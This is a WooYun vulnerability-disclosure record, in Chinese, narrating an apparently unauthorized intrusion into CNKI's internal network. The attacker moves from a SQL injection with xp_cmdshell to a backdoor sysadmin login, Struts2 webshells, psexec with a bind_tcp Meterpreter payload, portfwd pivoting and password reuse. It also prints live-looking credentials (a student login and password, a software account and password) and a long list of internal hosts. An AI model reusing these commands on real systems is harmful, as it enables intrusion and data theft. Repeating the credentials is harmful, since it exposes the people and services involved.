{"id": 12801, "wybug_id": "wooyun-2015-0118680", "wybug_title": "针对知网CNKI一次简单的渗透测试", "wybug_corp": "中国知网", "wybug_author": "RedFree", "wybug_date": "2015-06-07 10:31", "wybug_open_date": "2015-07-26 18:40", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向公众公开  简要描述： 一个由外网渗透到CNKI内网的过程，因六月有更重要的事情要做，渗透到此为止。已知会忽略，提交权当笔记。^_^ 详细说明：  一个由外网渗透到CNKI内网和获取敏感数据的过程。整个渗透过程大致分为四部分：一、弱点刺探：打开通向内网之门    一次偶然的机会接触到了CNKI的“大学生论文管理系统”，发现了这个系统的一个注入点。一切从这里开始……    http://xynu.check.cnki.net/ 用户名为学号，密码为身份证后8位，通过信息搜集获取到了一堆账号，登录一个测试：学号：20115151013 密码：12027623\n\n    很幸运的是这个注入点数据库账户为DBA、支持多行执行，且可以使用xp_cmdshell/mssqlagent执行命令。\n\n    然而非常不幸的是虽然可以执行系统命令，但是经过一番测试，发现服务器不能连接外网，且站库已分离对外网不开放端口。那么要实际控制这台服务器就变的非常困难了，总不能每次都使用这个注入点去做事情。经过考虑，决定从其它方面着手。于是先使用两条语句添加了个sa权限账户备用：\nexec master.dbo.sp_addlogin name,passexec master.dbo.sp_addsrvrolemember name,sysadmin\n    为了缩短渗透时间，就先Google一下看看有没有一些已知漏洞可以方便快速的打入CNKI内网：\n\n    经过筛选，找到了两个Struts2命令执行的站点：esafety.cnki.net和www.dangshi.cnki.net:8080，成功上传Webshell后以备后用。\n\n    从IP地址可以看到，服务器也处于CNKI的内网中。使用net view命令获取到了工作组中的所有计算机名：\n\n    经过比对得知计算机名是和IP对应的，比如IP为10.1.80.201，计算机名就为CNKI-1-80-201。这对下一步的渗透起了很大的作用。    esafety.cnki.net只开放了80端口，而www.dangshi.cnki.net开放了80和8080端口。因为这两个服务器也无法连接外网，所以不能使用reverse_tcp来反弹meterpreter，只能考虑使用bind_tcp的方式。\n\n    经过考虑，决定停掉www.dangshi.cnki.net的一个服务80/8080端口来做为bind_Tcp的端口。于是使用Webshell执行iisreset /stop命令来停掉IIS，但结果却出乎意料。IIS并未停止，反而工作于8080端口的Apache却Duang了……因为CNKI内网各服务器之间并未限制各个端口的通迅，所以在esafety.cnki.net上执行以下两条命令来获取www.dangshi.cnki.net(内网IP:10.1.93.14已抓取管理的登录密码)bind_tcp的Meterpreter(已上传PsExec和Bind_Tcp payload到esafety.cnki.net的D:\\bak\\目录)：\npsexec -accepteulapsexec \\\\10.1.93.14 -u Administrator -p 抓到的密码 -c D:\\bak\\bind.exe -d\n    连接211.151.247.54（www.dangshi.cnki.net外网IP）的8080端口，成功获取到了Meterpreter。至此内网的大门已经洞开。（后面的一些截图并非是第一时间的；只是为了说明问题和原理后补上来的，所以有一些误差，请不要在意！）\n\n二、内网初探：扫描弱口令、攻击弱点服务、扩大信息收集面    1、构建可快速连接的内网渗透环境    使用Meterpreter和portfwd命令可以方便地转发内网端口到本地：\nportfwd add -l 4444 -p 3389 -r 127.0.0.1portfwd add -l 3333 -p 3389 -r 10.1.201.84 (这个是esafety.cnki.net的内网IP)\n\n\n    在10.1.93.14的IIS管理器中发现服务器上还运行着其它站点，于是找一个留下Webshell。这样就不用在10.1.201.84使用psexec来运行bind_tcp payload了，且上传文件会方便很多。\n\n\n\n    2、扫描一些包含弱口令的服务    由于我使用的网络不稳定且Meterpreter扫描一些服务的弱口令较慢，所以部分扫描任务直接放到了内网服务器上去完成。\n\n    可以看到这个网段服务器大部分使用的是IIS，那么扫描一下MSSQL弱口令会如何呢？\n\n\n\n    下面这个截图：10.1.202.10是之前存在注入点的那个数据服务器，入内网之后轻易便拿到了管理权（数据库中有不少高校老师和学生的信息哦）。上面的Kbase企业管理器连接着同网段的几台数据服务器（密码为空），内含信息没有去查看。\n\n    篇幅有限，其它网段同样的扫描就不截图说明了。经过前期简单的扫描，大致获取到了以下几台主机的管理权（仅扫描了10.1.201.0/24和10.1.202.0/24）：\n\n    从已获得权限的几台服务器的管理密码上能解读什么信息呢？①.可以看到，Administrator的密码都为9位，非常复杂且毫无规律。可以猜测服务器密码一定有一个统一的管理或是分派到各管理员/部门管理，当然也有可能服务器上安装有管理类的软件来负责密码的统一管理工作。这里仅仅是猜想。②.CNKI内网似乎已有人扫描过了，可以看到不同段MSSQL弱口令的服务器已被添加了aa账号（经过辨明这不是管理添加的）。三、交叉口令验证：通过已有账号信息获取其它服务器管理权    通过下图可以解析交叉口令的验证原理（仅仅一个方面）：\n\n    通过MSF使用已获得的账号密码信息来对整个网段进行检测：    交叉口令的来源很多，包含已有任何服务的口令。数据库口令、服务器登录口令、FTP口令、远程控制类软件口令（VNC、TeamViewer、Radmin、pcanywhere、向日葵等），其它服务类软件口令等。\n\n    验证账号：MI_Viewer  密码：MIOrchid#1 这组账号密码应该是某软件创建的。\n\n\n\n\n\n    交叉验证的工作模式：\n\n四、总结过程查缺补漏    在整个渗透过程中总结是不可少的。成功目标的多少和信息收集的多少成正比。总结整个过程如下：1、在整个过程中仅仅对10.1.201.0/24和10.1.201.0/24这两个子网做了检测，如果扩大攻击范围是不是可以获取更多服务器的权限？2、在整个过程中仅仅针对MSSQL、Windows口令做了扫描，如果将扫描对象扩大到每个已知服务是不是可以收获更多？（已发现数个服务器安装了Serv-u、pcanywhere等软件）3、一些专用软件了解不够，是不是要花些时间也对这些软件加以了解？（数个服务器安装了Kbase且为空口令，对这总数据库不了解就少了一条路）4、一些备份服务器上留有某些站点的源码，是否应该花些时间来对这些代码做一次审计以便获取现在提供服务的服务器的权限？5、通过查看某几个服务器的日志，发现有一个共同的IP登录过，是管理吗？知道了管理IP能干些什么呢？6、内网的一些服务器，发现安全漏洞的机率是不是更高些呢？附：net view后整理IP如下：\n10.0.93.10410.1.0.1010.1.10.110.1.10.1010.1.10.10010.1.10.10110.1.10.10310.1.10.10410.1.10.10510.1.10.10610.1.10.10710.1.10.10810.1.10.10910.1.10.1110.1.10.11010.1.10.11110.1.10.11210.1.10.11310.1.10.11410.1.10.11510.1.10.11610.1.10.11710.1.10.11810.1.10.11910.1.10.12010.1.10.12110.1.10.12210.1.10.12310.1.10.12410.1.10.12510.1.10.12610.1.10.12710.1.10.12810.1.10.12910.1.10.1310.1.10.13010.1.10.13210.1.10.13310.1.10.13410.1.10.13610.1.10.13710.1.10.13810.1.10.13910.1.10.1410.1.10.14010.1.10.14110.1.10.14210.1.10.14510.1.10.19810.1.10.210.1.10.2110.1.10.23810.1.10.2810.1.10.310.1.10.3110.1.10.3310.1.10.3510.1.10.3610.1.10.3710.1.10.3910.1.10.410.1.10.4410.1.10.510.1.10.5110.1.10.5310.1.10.5410.1.10.5610.1.10.5710.1.10.5810.1.10.610.1.10.6010.1.10.6110.1.10.6210.1.10.6310.1.10.6510.1.10.6610.1.10.6710.1.10.6810.1.10.710.1.10.7210.1.10.7410.1.10.7610.1.10.7810.1.10.810.1.10.8010.1.10.8210.1.10.8310.1.10.8410.1.10.8510.1.10.8610.1.10.8710.1.10.8810.1.10.8910.1.10.910.1.10.9010.1.10.9110.1.10.9210.1.10.9610.1.10.9710.1.10.9910.1.11.1010.1.11.1210.1.11.2010.1.11.20110.1.11.20210.1.11.2110.1.11.2210.1.11.2310.1.11.2410.1.11.2510.1.11.2610.1.11.2710.1.11.2810.1.11.2910.1.11.3010.1.11.3110.1.110.110.1.110.1010.1.110.10010.1.110.1110.1.110.13410.1.110.1710.1.110.1810.1.110.1910.1.110.2010.1.110.20110.1.110.20210.1.110.20310.1.110.20410.1.110.20510.1.110.20610.1.110.20710.1.110.20810.1.110.20910.1.110.21010.1.110.21110.1.110.21210.1.110.21310.1.110.21410.1.110.21510.1.110.21610.1.110.21710.1.110.21810.1.110.21910.1.110.22010.1.110.22110.1.110.22210.1.110.22310.1.110.22410.1.110.22510.1.110.22610.1.110.2410.1.110.2810.1.110.3810.1.110.3910.1.110.5910.1.110.6110.1.110.6210.1.110.6310.1.110.6410.1.110.6510.1.110.6710.1.110.6810.1.110.6910.1.110.7010.1.110.7110.1.110.7210.1.110.7310.1.110.7410.1.110.8010.1.111.00910.1.111.110.1.111.10010.1.111.10110.1.111.10210.1.111.10310.1.111.10410.1.111.10510.1.111.10810.1.111.11310.1.111.210.1.111.2610.1.111.2710.1.111.2810.1.111.2910.1.111.310.1.111.3010.1.111.3110.1.111.410.1.111.510.1.111.5110.1.111.5210.1.111.5410.1.111.5910.1.111.6110.1.111.6210.1.111.810.1.111.9810.1.112.110.1.112.1010.1.112.1110.1.112.1210.1.112.1310.1.112.1410.1.112.1510.1.112.1610.1.112.1710.1.112.1810.1.112.1910.1.112.310.1.12.1110.1.12.1210.1.12.1310.1.12.1510.1.12.1810.1.12.1910.1.12.2010.1.12.2210.1.12.2310.1.12.2410.1.12.2510.1.12.2610.1.12.2810.1.12.2910.1.12.310.1.12.3010.1.12.3110.1.12.3210.1.12.3410.1.12.3510.1.12.3710.1.12.3810.1.12.3910.1.12.410.1.12.4010.1.12.510.1.12.5110.1.12.5210.1.12.5310.1.12.5410.1.12.610.1.12.710.1.12.810.1.12.910.1.120.12410.1.120.15110.1.120.18010.1.120.18210.1.120.18310.1.120.20110.1.120.20210.1.120.20310.1.120.20410.1.120.20510.1.120.20610.1.120.20710.1.120.20810.1.120.20910.1.120.21010.1.120.21110.1.120.21210.1.120.21310.1.120.21410.1.120.21510.1.120.21610.1.120.21710.1.120.21810.1.120.21910.1.120.22010.1.120.22110.1.120.22210.1.120.22710.1.120.22810.1.120.23810.1.120.24010.1.120.25110.1.121.1910.1.121.8110.1.121.9410.1.122.10110.1.122.10410.1.122.11210.1.122.11410.1.122.11510.1.122.12010.1.122.12310.1.122.20110.1.122.20210.1.123.10110.1.123.10210.1.123.20110.1.123.20210.1.123.21610.1.123.21710.1.123.23110.1.123.23210.1.123.24410.1.123.24510.1.123.3110.1.125.10110.1.125.15410.1.128.10110.1.128.10210.1.129.10110.1.129.10210.1.16.20110.1.16.20210.1.16.20310.1.16.20410.1.16.20510.1.180.4410.1.20.210.1.20.20110.1.201.110.1.201.10010.1.201.10910.1.201.1110.1.201.11010.1.201.11110.1.201.11210.1.201.11310.1.201.11410.1.201.11610.1.201.12210.1.201.12310.1.201.12410.1.201.12510.1.201.12610.1.201.12910.1.201.13010.1.201.13110.1.201.13210.1.201.13310.1.201.13410.1.201.13510.1.201.13710.1.201.13810.1.201.13910.1.201.14010.1.201.1510.1.201.15510.1.201.15710.1.201.15910.1.201.1610.1.201.16210.1.201.16310.1.201.16410.1.201.16510.1.201.16810.1.201.1710.1.201.17110.1.201.17210.1.201.18910.1.201.210.1.201.20110.1.201.2310.1.201.23610.1.201.23710.1.201.310.1.201.3010.1.201.3110.1.201.3310.1.201.3510.1.201.3610.1.201.3710.1.201.3810.1.201.410.1.201.4010.1.201.4210.1.201.4310.1.201.510.1.201.5210.1.201.5410.1.201.5710.1.201.610.1.201.6710.1.201.6810.1.201.710.1.201.7110.1.201.7210.1.201.7410.1.201.810.1.201.8010.1.201.8410.1.201.8710.1.201.910.1.201.9110.1.202.1010.1.202.10210.1.202.10510.1.202.10610.1.202.10710.1.202.10810.1.202.11010.1.202.11110.1.202.11210.1.202.11310.1.202.11610.1.202.11710.1.202.11810.1.202.11910.1.202.1210.1.202.12010.1.202.12110.1.202.12210.1.202.12310.1.202.12410.1.202.12510.1.202.1810.1.202.1910.1.202.19010.1.202.19110.1.202.19910.1.202.20210.1.202.20510.1.202.20610.1.202.20710.1.202.21310.1.202.21910.1.202.22010.1.202.22110.1.202.22210.1.202.23510.1.202.23710.1.202.23810.1.202.23910.1.202.24010.1.202.24210.1.202.24310.1.202.24410.1.202.2910.1.202.3210.1.202.3310.1.202.3410.1.202.3510.1.202.3610.1.202.3710.1.202.3810.1.202.3910.1.202.4010.1.202.4110.1.202.4210.1.202.4310.1.202.4510.1.202.4710.1.202.4810.1.202.5010.1.202.5110.1.202.6010.1.202.6110.1.202.7110.1.202.9910.1.203.1110.1.203.210.1.203.310.1.203.810.1.60.10910.1.8.310.1.8.410.1.8.510.1.8.610.1.8.710.1.8.810.1.80.110.1.80.1010.1.80.1110.1.80.11010.1.80.1210.1.80.210.1.80.20110.1.80.20210.1.80.310.1.80.3810.1.80.410.1.88.1010.1.88.10210.1.88.18310.1.88.2110.1.88.2210.1.9.110.1.9.1010.1.9.1110.1.9.210.1.9.310.1.9.510.1.9.610.1.96.110.1.96.210.1.99.12410.1.99.14010.10.1.20.2210.10.247.42\n   漏洞证明：  \n\n   修复方案：  全面检查清除后门加强教育   版权声明：转载请注明来源 RedFree@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-11 18:38 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向网站管理单位通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-26 18:52 |    \t\tonpu \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:19        | 静坐常思己过，闲谈莫论人非)\t\t \n  神奇的路人甲    \n     2015-07-26 19:23 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  学习了。。    \n     2015-07-26 22:51 |    \t\t默之 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:67        | 沉淀。)\t\t \n  厉害    \n     2015-07-27 08:22 |    \t\tLooke \t\t\t( 普通白帽子  |\t\t\t        Rank:619 漏洞数:93        | 可顺势而为，何必逆水行舟)\t\t \n  楼主的思路流程好清晰，赞一个    \n     2015-07-27 08:51 |    \t\tCoeus \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 入门级小白，承接原子弹抛光/打腊、拆洗导...)\t\t \n  涨姿势了    \n     2015-07-27 08:59 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  这个梗不错    \n     2015-07-27 09:18 |    \t\tHckmaple \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:14        | ~~~)\t\t \n  牛逼    \n     2015-07-27 17:29 |    \t\taNsSe \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 独自一人走天下)\t\t \n  好牛逼 赞一个 内网一日游    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}